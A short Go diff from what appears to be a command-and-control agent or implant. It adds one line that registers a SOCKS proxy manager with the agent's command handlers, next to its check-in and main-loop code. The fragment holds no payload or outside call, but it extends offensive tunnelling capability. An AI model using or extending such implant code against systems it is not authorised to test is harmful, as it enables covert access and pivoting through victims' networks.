@@ -119,6 +119,7 @@ checkinDone:
 	// Initialize SOCKS proxy manager
 	socksManager := socks.NewManager()
 	defer socksManager.Close()
+	commands.RegisterSocksManager(socksManager)
 
 	// Start main execution loop
 	log.Printf("running %s", agent.PayloadUUID[:8])
